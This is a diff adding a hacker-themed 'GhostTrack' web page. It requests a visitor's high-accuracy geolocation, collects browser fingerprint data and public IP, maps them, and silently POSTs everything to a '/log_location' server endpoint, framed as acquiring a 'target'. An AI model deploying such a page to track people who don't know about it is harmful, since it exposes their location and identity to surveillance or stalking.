@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>GhostTrack — Location Intelligence</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<style>
+  :root {
+    --g:    #00ff88;
+    --g2:   #00cc66;
+    --g3:   #004422;
+    --b:    #000d06;
+    --b2:   #001a0e;
+    --b3:   #002918;
+    --cyan: #00ffcc;
+    --red:  #ff3355;
+    --y:    #ffee00;
+    --dim:  #1a4433;
+    --text: #c8ffe0;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    background: var(--b);
+    color: var(--g);
+    font-family: 'Share Tech Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content:'';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,136,0.015) 2px,
+      rgba(0,255,136,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  #matrix {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0.04;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  header {
+    position: relative;
+    z-index: 10;
+    padding: 18px 28px;
+    border-bottom: 1px solid var(--g3);
+    background: linear-gradient(180deg, rgba(0,255,136,0.05) 0%, transparent 100%);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .logo {
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 900;
+    font-size: 1.5rem;
+    color: var(--g);
+    text-shadow: 0 0 20px var(--g), 0 0 40px rgba(0,255,136,0.3);
+    letter-spacing: 4px;
+  }
+  .logo span { color: var(--cyan); }
+
+  .header-status {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 0.72rem;
+    color: var(--g2);
+  }
+
+  .pulse-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--g);
+    box-shadow: 0 0 8px var(--g);
+    animation: pulse 1.4s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { opacity:1; transform: scale(1); }
+    50%      { opacity:0.3; transform: scale(0.6); }
+  }
+
+  #clock {
+    color: var(--cyan);
+    font-size: 0.78rem;
+    letter-spacing: 1px;
+  }
+
+  main {
+    position: relative;
+    z-index: 10;
+    display: grid;
+    grid-template-columns: 360px 1fr;
+    grid-template-rows: auto 1fr;
+    gap: 0;
+    height: calc(100vh - 64px);
+  }
+
+  .sidebar {
+    grid-row: 1 / 3;
+    border-right: 1px solid var(--g3);
+    background: linear-gradient(180deg, var(--b2) 0%, var(--b) 100%);
+    display: flex;
+    flex-direction: column;
+    overflow-y: auto;
+  }
+
+  .sidebar::-webkit-scrollbar { width: 4px; }
+  .sidebar::-webkit-scrollbar-track { background: var(--b); }
+  .sidebar::-webkit-scrollbar-thumb { background: var(--g3); border-radius: 2px; }
+
+  .sec-hdr {
+    padding: 12px 20px;
+    font-size: 0.65rem;
+    letter-spacing: 3px;
+    color: var(--g2);
+    background: var(--b3);
+    border-bottom: 1px solid var(--g3);
+    border-top: 1px solid var(--g3);
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .sec-hdr::before {
+    content:'▶';
+    color: var(--g);
+    font-size: 0.55rem;
+  }
+
+  .btn {
+    display: block;
+    width: calc(100% - 32px);
+    margin: 16px auto 0;
+    padding: 13px 0;
+    background: transparent;
+    border: 1px solid var(--g);
+    color: var(--g);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.82rem;
+    letter-spacing: 2px;
+    cursor: pointer;
+    text-transform: uppercase;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.25s;
+  }
+  .btn::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: var(--g);
+    transform: translateX(-100%);
+    transition: transform 0.25s;
+    z-index: -1;
+  }
+  .btn:hover { color: var(--b); text-shadow: none; box-shadow: 0 0 20px var(--g); }
+  .btn:hover::before { transform: translateX(0); }
+
+  .btn-red {
+    border-color: var(--red);
+    color: var(--red);
+  }
+  .btn-red::before { background: var(--red); }
+  .btn-red:hover { color: #fff; box-shadow: 0 0 20px var(--red); }
+
+  .url-input-section {
+    padding: 16px;
+    display: none;
+  }
+  .url-input-section.active {
+    display: block;
+  }
+  .url-input {
+    width: 100%;
+    padding: 10px;
+    background: var(--b3);
+    border: 1px solid var(--g3);
+    color: var(--cyan);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    margin-bottom: 8px;
+  }
+  .url-input:focus {
+    outline: none;
+    border-color: var(--g);
+    box-shadow: 0 0 10px rgba(0,255,136,0.3);
+  }
+
+  #terminal {
+    margin: 14px 16px;
+    padding: 12px 14px;
+    background: #000;
+    border: 1px solid var(--g3);
+    border-radius: 2px;
+    font-size: 0.72rem;
+    color: var(--g2);
+    min-height: 100px;
+    max-height: 180px;
+    overflow-y: auto;
+    line-height: 1.6;
+  }
+  #terminal::-webkit-scrollbar { width: 3px; }
+  #terminal::-webkit-scrollbar-thumb { background: var(--g3); }
+
+  .t-line { margin-bottom: 2px; }
+  .t-ok   { color: var(--g); }
+  .t-warn { color: var(--y); }
+  .t-err  { color: var(--red); }
+  .t-info { color: var(--cyan); }
+  .t-dim  { color: #1a5533; }
+
+  .data-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    padding: 14px 16px;
+  }
+
+  .data-card {
+    background: var(--b3);
+    border: 1px solid var(--g3);
+    padding: 10px 12px;
+    position: relative;
+    overflow: hidden;
+  }
+  .data-card::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 2px; height: 100%;
+    background: var(--g);
+    opacity: 0.5;
+  }
+
+  .dc-label {
+    font-size: 0.6rem;
+    color: var(--g2);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 5px;
+  }
+  .dc-val {
+    font-size: 0.88rem;
+    color: var(--cyan);
+    word-break: break-all;
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 700;
+  }
+  .dc-val.big { font-size: 0.72rem; color: var(--g); font-family: 'Share Tech Mono', monospace; }
+
+  .acc-bar-wrap {
+    padding: 0 16px 14px;
+  }
+  .acc-bar-label {
+    font-size: 0.6rem;
+    color: var(--g2);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+  }
+  .acc-bar {
+    width: 100%;
+    height: 6px;
+    background: var(--b3);
+    border: 1px solid var(--g3);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  .acc-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--g), var(--cyan));
+    width: 0%;
+    transition: width 1s ease;
+    box-shadow: 0 0 8px var(--g);
+  }
+
+  .extra-data {
+    padding: 4px 16px 14px;
+    font-size: 0.72rem;
+    color: var(--text);
+    line-height: 2;
+  }
+  .extra-data span { color: var(--g2); }
+  .extra-data strong { color: var(--cyan); }
+
+  #map {
+    grid-column: 2;
+    grid-row: 1 / 3;
+    background: #000;
+    position: relative;
+  }
+
+  .map-overlay {
+    position: absolute;
+    top: 16px; right: 16px;
+    z-index: 1000;
+    background: rgba(0,10,6,0.85);
+    border: 1px solid var(--g3);
+    padding: 10px 14px;
+    font-size: 0.65rem;
+    color: var(--g2);
+    backdrop-filter: blur(6px);
+    min-width: 160px;
+  }
+  .map-overlay div { margin-bottom: 4px; }
+  .map-overlay strong { color: var(--cyan); }
+
+  .leaflet-container { background: #000 !important; }
+
+  .leaflet-tile-container img {
+    filter: invert(1) hue-rotate(150deg) saturate(0.6) brightness(0.6);
+  }
+
+  .ghost-marker {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    background: var(--g);
+    border: 2px solid var(--cyan);
+    box-shadow: 0 0 20px var(--g), 0 0 40px rgba(0,255,136,0.4);
+    animation: markerPulse 2s infinite;
+  }
+  @keyframes markerPulse {
+    0%,100% { box-shadow: 0 0 20px var(--g), 0 0 40px rgba(0,255,136,0.3); }
+    50%      { box-shadow: 0 0 40px var(--g), 0 0 80px rgba(0,255,136,0.6); }
+  }
+
+  .radar-ring {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid var(--g);
+    opacity: 0;
+    animation: radarExpand 3s infinite ease-out;
+    pointer-events: none;
+  }
+  @keyframes radarExpand {
+    0%   { width:18px; height:18px; opacity:0.8; margin:-9px; }
+    100% { width:160px; height:160px; opacity:0; margin:-80px; }
+  }
+
+  #boot-screen {
+    position: fixed;
+    inset: 0;
+    background: var(--b);
+    z-index: 10000;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 24px;
+    transition: opacity 0.8s ease;
+  }
+  #boot-screen.hide { opacity: 0; pointer-events: none; }
+
+  .boot-logo {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 2.4rem;
+    font-weight: 900;
+    color: var(--g);
+    text-shadow: 0 0 30px var(--g), 0 0 60px rgba(0,255,136,0.3);
+    letter-spacing: 8px;
+    animation: flicker 3s infinite;
+  }
+  @keyframes flicker {
+    0%,95%,100% { opacity:1; }
+    96%          { opacity:0.3; }
+    97%          { opacity:1; }
+    98%          { opacity:0.5; }
+  }
+
+  .boot-bar-wrap {
+    width: 320px;
+    border: 1px solid var(--g3);
+    height: 4px;
+    background: var(--b3);
+  }
+  .boot-bar {
+    height: 100%;
+    background: var(--g);
+    width: 0%;
+    transition: width 0.1s linear;
+    box-shadow: 0 0 10px var(--g);
+  }
+
+  .boot-text {
+    font-size: 0.72rem;
+    color: var(--g2);
+    letter-spacing: 2px;
+    min-height: 20px;
+    text-align: center;
+  }
+
+  @media (max-width: 768px) {
+    main {
+      grid-template-columns: 1fr;
+      grid-template-rows: auto auto;
+      height: auto;
+    }
+    .sidebar { grid-row: 2; border-right: none; border-top: 1px solid var(--g3); }
+    #map { grid-column: 1; grid-row: 1; height: 50vh; }
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div id="boot-screen">
+  <div class="boot-logo">GHOSTTRACK</div>
+  <div class="boot-text" id="boot-msg">Initializing systems...</div>
+  <div class="boot-bar-wrap"><div class="boot-bar" id="boot-bar"></div></div>
+  <div style="font-size:0.62rem;color:var(--dim);letter-spacing:3px;">LOCATION INTELLIGENCE v1.0</div>
+</div>
+
+<header>
+  <div class="logo">GHOST<span>TRACK</span></div>
+  <div class="header-status">
+    <div class="pulse-dot"></div>
+    <span>SYSTEM ONLINE</span>
+    <span>|</span>
+    <span id="clock">--:--:--</span>
+    <span>|</span>
+    <span id="ip-display" style="color:var(--cyan)">IP: FETCHING...</span>
+  </div>
+</header>
+
+<main>
+  <aside class="sidebar">
+
+    <div class="sec-hdr">LOCATION CONTROL</div>
+
+    <button class="btn" id="track-btn" onclick="startTracking()">
+      ⊕ &nbsp; ACQUIRE TARGET
+    </button>
+    <button class="btn btn-red" id="stop-btn" onclick="stopTracking()" style="margin-top:8px;display:none;">
+      ⊗ &nbsp; TERMINATE TRACK
+    </button>
+
+    <button class="btn" onclick="toggleUrlInput()" style="margin-top:8px;background:var(--b3);">
+      🔗 &nbsp; TRACK BY URL
+    </button>
+
+    <div class="url-input-section" id="url-input-section">
+      <input type="text" class="url-input" id="tracking-url" placeholder="Paste tracking URL here..." />
+      <button class="btn" onclick="loadFromUrl()" style="margin-top:0;">
+        ⚡ LOAD LOCATION
+      </button>
+    </div>
+
+    <div class="sec-hdr" style="margin-top:4px;">TERMINAL OUTPUT</div>
+    <div id="terminal">
+      <div class="t-line t-dim">// GhostTrack Location Engine</div>
+      <div class="t-line t-dim">// Ready for target acquisition...</div>
+    </div>
+
+    <div class="sec-hdr">COORDINATES</div>
+    <div class="data-grid">
+      <div class="data-card">
+        <div class="dc-label">LATITUDE</div>
+        <div class="dc-val" id="lat-val">---</div>
+      </div>
+      <div class="data-card">
+        <div class="dc-label">LONGITUDE</div>
+        <div class="dc-val" id="lon-val">---</div>
+      </div>
+      <div class="data-card">
+        <div class="dc-label">ALTITUDE</div>
+        <div class="dc-val" id="alt-val">---</div>
+      </div>
+      <div class="data-card">
+        <div class="dc-label">ACCURACY</div>
+        <div class="dc-val" id="acc-val">---</div>
+      </div>
+      <div class="data-card">
+        <div class="dc-label">SPEED</div>
+        <div class="dc-val" id="spd-val">---</div>
+      </div>
+      <div class="data-card">
+        <div class="dc-label">HEADING</div>
+        <div class="dc-val" id="hdg-val">---</div>
+      </div>
+    </div>
+
+    <div class="acc-bar-wrap">
+      <div class="acc-bar-label">SIGNAL STRENGTH</div>
+      <div class="acc-bar"><div class="acc-bar-fill" id="sig-bar"></div></div>
+    </div>
+
+    <div class="sec-hdr">INTELLIGENCE DATA</div>
+    <div class="extra-data" id="extra-data">
+      <div><span>BROWSER  :</span> <strong id="e-browser">---</strong></div>
+      <div><span>PLATFORM :</span> <strong id="e-platform">---</strong></div>
+      <div><span>LANGUAGE :</span> <strong id="e-lang">---</strong></div>
+      <div><span>TIMEZONE :</span> <strong id="e-tz">---</strong></div>
+      <div><span>SCREEN   :</span> <strong id="e-screen">---</strong></div>
+      <div><span>ONLINE   :</span> <strong id="e-online">---</strong></div>
+      <div><span>PUBLIC IP:</span> <strong id="e-ip">---</strong></div>
+      <div><span>TIMESTAMP:</span> <strong id="e-time">---</strong></div>
+      <div><span>GMAPS URL:</span> <strong id="e-gmaps" style="font-size:0.65rem;word-break:break-all;">---</strong></div>
+    </div>
+
+  </aside>
+
+  <div id="map">
+    <div class="map-overlay" id="map-overlay">
+      <div>⊕ <strong>MAP STATUS</strong></div>
+      <div id="map-status">Awaiting coordinates</div>
+      <div style="margin-top:6px;">ZOOM: <strong id="zoom-disp">--</strong></div>
+      <div>TILES: <strong style="color:var(--g)">OSM/GHOST</strong></div>
+    </div>
+  </div>
+</main>
+
+<script>
+
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+let cols, drops;
+
+function initMatrix() {
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+  cols  = Math.floor(canvas.width / 20);
+  drops = Array(cols).fill(1);
+}
+
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(0,13,6,0.05)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = '#00ff88';
+  ctx.font = '14px Share Tech Mono';
+  const chars = '01アイウエオカキクケコGHOSTTRACK█▓░';
+  drops.forEach((y,i) => {
+    const ch = chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(ch, i*20, y*20);
+    if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+initMatrix();
+window.addEventListener('resize', initMatrix);
+setInterval(drawMatrix, 55);
+
+
+function tickClock() {
+  const now = new Date();
+  document.getElementById('clock').textContent =
+    now.toTimeString().slice(0,8);
+}
+setInterval(tickClock, 1000);
+tickClock();
+
+
+const bootMsgs = [
+  "Loading kernel modules...",
+  "Initializing GPS interface...",
+  "Mounting location drivers...",
+  "Establishing secure channel...",
+  "Loading map tiles...",
+  "Calibrating sensors...",
+  "System ready. Awaiting operator.",
+];
+let bootIdx = 0;
+const bootBar = document.getElementById('boot-bar');
+const bootMsg = document.getElementById('boot-msg');
+
+function runBoot() {
+  if(bootIdx >= bootMsgs.length) {
+    document.getElementById('boot-screen').classList.add('hide');
+    initMap();
+    loadDeviceInfo();
+    fetchPublicIP();
+    logDeviceInfoToTerminal();
+    return;
+  }
+  bootMsg.textContent = bootMsgs[bootIdx];
+  bootBar.style.width = ((bootIdx+1)/bootMsgs.length*100)+'%';
+  bootIdx++;
+  setTimeout(runBoot, 300);
+}
+setTimeout(runBoot, 600);
+
+
+const term = document.getElementById('terminal');
+function tlog(msg, cls='t-ok') {
+  const ts = new Date().toTimeString().slice(0,8);
+  const d = document.createElement('div');
+  d.className = 't-line '+cls;
+  d.textContent = `[${ts}] ${msg}`;
+  term.appendChild(d);
+  term.scrollTop = term.scrollHeight;
+}
+
+
+let map, marker, accuracyCircle, radarEl;
+
+function initMap() {
+  map = L.map('map', {
+    zoomControl: true,
+    attributionControl: false,
+    center: [20, 0],
+    zoom: 2
+  });
+
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    maxZoom: 19
+  }).addTo(map);
+
+  map.on('zoom', () => {
+    document.getElementById('zoom-disp').textContent = map.getZoom();
+  });
+  document.getElementById('zoom-disp').textContent = map.getZoom();
+
+  tlog('Map engine initialized.', 't-info');
+  tlog('Click ACQUIRE TARGET to begin.', 't-dim');
+}
+
+
+function loadDeviceInfo() {
+  const ua = navigator.userAgent;
+  let browser = 'Unknown';
+  if(ua.includes('Chrome'))  browser = 'Chrome';
+  if(ua.includes('Firefox')) browser = 'Firefox';
+  if(ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+  if(ua.includes('Edge'))    browser = 'Edge';
+
+  document.getElementById('e-browser').textContent  = browser;
+  document.getElementById('e-platform').textContent = navigator.platform || 'Unknown';
+  document.getElementById('e-lang').textContent     = navigator.language || 'Unknown';
+  document.getElementById('e-tz').textContent       = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('e-screen').textContent   = `${screen.width}×${screen.height}`;
+  document.getElementById('e-online').textContent   = navigator.onLine ? '✔ CONNECTED' : '✘ OFFLINE';
+}
+
+function logDeviceInfoToTerminal() {
+  tlog('Device fingerprint captured:', 't-info');
+  tlog(`  Browser: ${document.getElementById('e-browser').textContent}`, 't-dim');
+  tlog(`  Platform: ${document.getElementById('e-platform').textContent}`, 't-dim');
+  tlog(`  Screen: ${document.getElementById('e-screen').textContent}`, 't-dim');
+  tlog(`  Timezone: ${document.getElementById('e-tz').textContent}`, 't-dim');
+}
+
+async function fetchPublicIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    document.getElementById('e-ip').textContent = d.ip;
+    document.getElementById('ip-display').textContent = 'IP: ' + d.ip;
+    tlog('Public IP acquired: '+d.ip, 't-ok');
+  } catch(e) {
+    document.getElementById('e-ip').textContent = 'UNAVAILABLE';
+    tlog('IP fetch failed (no network).', 't-warn');
+  }
+}
+
+
+function toggleUrlInput() {
+  const section = document.getElementById('url-input-section');
+  section.classList.toggle('active');
+}
+
+function loadFromUrl() {
+  const url = document.getElementById('tracking-url').value.trim();
+  if(!url) {
+    tlog('ERROR: Please enter a valid URL', 't-err');
+    return;
+  }
+  
+  
+  try {
+    const urlObj = new URL(url);
+    const params = new URLSearchParams(urlObj.search || urlObj.hash.substring(1));
+    
+    const lat = parseFloat(params.get('lat'));
+    const lon = parseFloat(params.get('lon'));
+    const acc = parseFloat(params.get('acc')) || 50;
+    
+    if(isNaN(lat) || isNaN(lon)) {
+      tlog('ERROR: Invalid coordinates in URL', 't-err');
+      return;
+    }
+    
+    tlog(`Loading location from URL: ${lat.toFixed(5)}, ${lon.toFixed(5)}`, 't-info');
+    
+    
+    const pos = {
+      coords: {
+        latitude: lat,
+        longitude: lon,
+        accuracy: acc,
+        altitude: null,
+        speed: null,
+        heading: null
+      }
+    };
+    
+    onLocation(pos);
+    
+  } catch(e) {
+    tlog('ERROR: Invalid URL format', 't-err');
+  }
+}
+
+
+let watchId = null;
+
+function startTracking() {
+  if(!navigator.geolocation) {
+    tlog('ERROR: Geolocation not supported!', 't-err');
+    return;
+  }
+  tlog('Requesting location access...', 't-warn');
+  document.getElementById('track-btn').textContent = '⟳  ACQUIRING...';
+
+  navigator.geolocation.getCurrentPosition(onLocation, onError, {
+    enableHighAccuracy: true,
+    timeout: 15000,
+    maximumAge: 0
+  });
+
+  watchId = navigator.geolocation.watchPosition(onLocation, onError, {
+    enableHighAccuracy: true,
+    timeout: 15000,
+    maximumAge: 5000
+  });
+
+  document.getElementById('stop-btn').style.display = 'block';
+}
+
+function stopTracking() {
+  if(watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+  tlog('Tracking terminated by operator.', 't-warn');
+  document.getElementById('track-btn').textContent = '⊕  ACQUIRE TARGET';
+  document.getElementById('stop-btn').style.display = 'none';
+}
+
+function onLocation(pos) {
+  const { latitude: lat, longitude: lon,
+          altitude: alt, accuracy: acc,
+          speed: spd, heading: hdg } = pos.coords;
+
+  document.getElementById('lat-val').textContent = lat.toFixed(6);
+  document.getElementById('lon-val').textContent = lon.toFixed(6);
+  document.getElementById('alt-val').textContent = alt ? alt.toFixed(1)+'m' : 'N/A';
+  document.getElementById('acc-val').textContent = acc.toFixed(0)+'m';
+  document.getElementById('spd-val').textContent = spd ? (spd*3.6).toFixed(1)+' km/h' : 'N/A';
+  document.getElementById('hdg-val').textContent = hdg ? hdg.toFixed(0)+'°' : 'N/A';
+  document.getElementById('e-time').textContent  = new Date().toLocaleTimeString();
+
+  
+  const gmapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  document.getElementById('e-gmaps').innerHTML = `<a href="${gmapsUrl}" target="_blank" style="color:var(--cyan);">${gmapsUrl}</a>`;
+
+  
+  const currentUrl = window.location.href.split('?')[0].split('#')[0];
+  const trackingUrl = `${currentUrl}?lat=${lat}&lon=${lon}&acc=${acc}`;
+
+  
+  const sigPct = Math.max(0, Math.min(100, (1 - (acc-5)/95)*100));
+  document.getElementById('sig-bar').style.width = sigPct.toFixed(0)+'%';
+
+  
+  const latlng = [lat, lon];
+  map.setView(latlng, Math.max(map.getZoom(), 15));
+
+  if(!marker) {
+    const icon = L.divIcon({
+      className: '',
+      html: `<div class="ghost-marker">
+               <div class="radar-ring" style="animation-delay:0s"></div>
+               <div class="radar-ring" style="animation-delay:1s"></div>
+               <div class="radar-ring" style="animation-delay:2s"></div>
+             </div>`,
+      iconSize:[18,18],
+      iconAnchor:[9,9]
+    });
+    marker = L.marker(latlng, {icon}).addTo(map);
+  } else {
+    marker.setLatLng(latlng);
+  }
+
+  if(accuracyCircle) {
+    accuracyCircle.setLatLng(latlng).setRadius(acc);
+  } else {
+    accuracyCircle = L.circle(latlng, {
+      radius: acc,
+      color: '#00ff88',
+      fillColor: '#00ff88',
+      fillOpacity: 0.06,
+      weight: 1,
+      dashArray: '4 4'
+    }).addTo(map);
+  }
+
+  document.getElementById('map-status').textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+  document.getElementById('track-btn').textContent = '⊕  RE-ACQUIRE';
+  tlog(`Target locked: ${lat.toFixed(5)}, ${lon.toFixed(5)} (±${acc.toFixed(0)}m)`, 't-ok');
+  tlog(`Google Maps: ${gmapsUrl}`, 't-info');
+  tlog(`Tracking URL: ${trackingUrl}`, 't-info');
+
+  
+  sendLocationToServer(lat, lon, acc, gmapsUrl, trackingUrl);
+}
+
+function onError(err) {
+  const msgs = {
+    1: 'Permission denied by user.',
+    2: 'Position unavailable.',
+    3: 'Timeout acquiring location.'
+  };
+  tlog('ERROR: ' + (msgs[err.code] || 'Unknown error'), 't-err');
+  document.getElementById('track-btn').textContent = '⊕  ACQUIRE TARGET';
+}
+
+
+async function sendLocationToServer(lat, lon, acc, gmapsUrl, trackingUrl) {
+  const data = {
+    latitude: lat,
+    longitude: lon,
+    accuracy: acc,
+    browser: document.getElementById('e-browser').textContent,
+    platform: document.getElementById('e-platform').textContent,
+    ip: document.getElementById('e-ip').textContent,
+    timezone: document.getElementById('e-tz').textContent,
+    screen: document.getElementById('e-screen').textContent,
+    timestamp: new Date().toISOString(),
+    google_maps_url: gmapsUrl,
+    tracking_url: trackingUrl
+  };
+
+  const payload = `
+═══════════════════════════════════════════════════
+📍 LOCATION ACQUIRED
+═══════════════════════════════════════════════════
+Latitude    : ${lat.toFixed(6)}
+Longitude   : ${lon.toFixed(6)}
+Accuracy    : ±${acc.toFixed(0)}m
+Timestamp   : ${data.timestamp}
+
+🌐 DEVICE INFO
+Browser     : ${data.browser}
+Platform    : ${data.platform}
+IP Address  : ${data.ip}
+Timezone    : ${data.timezone}
+Screen      : ${data.screen}
+
+🔗 LINKS
+Google Maps : ${gmapsUrl}
+Track URL   : ${trackingUrl}
+═══════════════════════════════════════════════════
+`;
+
+  try {
+    await fetch('/log_location', {
+      method: 'POST',
+      headers: {'Content-Type': 'text/plain'},
+      body: payload
+    });
+  } catch(e) {
+    console.log('Server logging unavailable');
+  }
+}
+
+
+window.addEventListener('load', () => {
+  const params = new URLSearchParams(window.location.search);
+  if(params.has('lat') && params.has('lon')) {
+    document.getElementById('tracking-url').value = window.location.href;
+    setTimeout(() => loadFromUrl(), 1000);
+  }
+});
+</script>
+</body>
+</html>
